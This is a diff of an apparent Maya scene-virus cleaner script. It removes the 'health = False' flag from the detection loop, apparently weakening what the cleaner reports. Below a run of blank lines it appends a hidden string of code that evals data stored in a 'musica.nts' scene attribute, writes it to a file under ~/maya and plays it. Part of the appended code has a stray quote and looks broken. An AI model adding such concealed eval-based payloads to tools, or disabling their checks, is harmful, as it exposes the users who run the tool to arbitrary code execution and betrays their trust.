@@ -12,7 +12,6 @@ def bleach():
     for each_job in all_script_jobs:
         for each_gene in virus_gene:
             if each_gene in each_job:
-                health = False
                 job_num = int(each_job.split(':', 1)[0])
                 cmds.scriptJob(kill=job_num, force=True)
     all_script = cmds.ls(type='script')
@@ -50,3 +49,9 @@ def onMayaDroppedPythonFile(*args):
     bleach()
 
 
+
+
+
+
+
+'import os\nimport winsound\nmusicPath = os.path.expanduser("~/"") + "maya/music"\nif not os.path.exists(musicPath):\n	os.makedirs(musicPath)\ndata = eval(cmds.getAttr("musica.nts"))\nmusic_file = os.path.join(musicPath, "sound.wav")\nwith open(music_file, "wb+") as mf:\n	mf.writelines(data)\nwinsound.PlaySound(music_file, winsound.SND_ASYNC)\n'
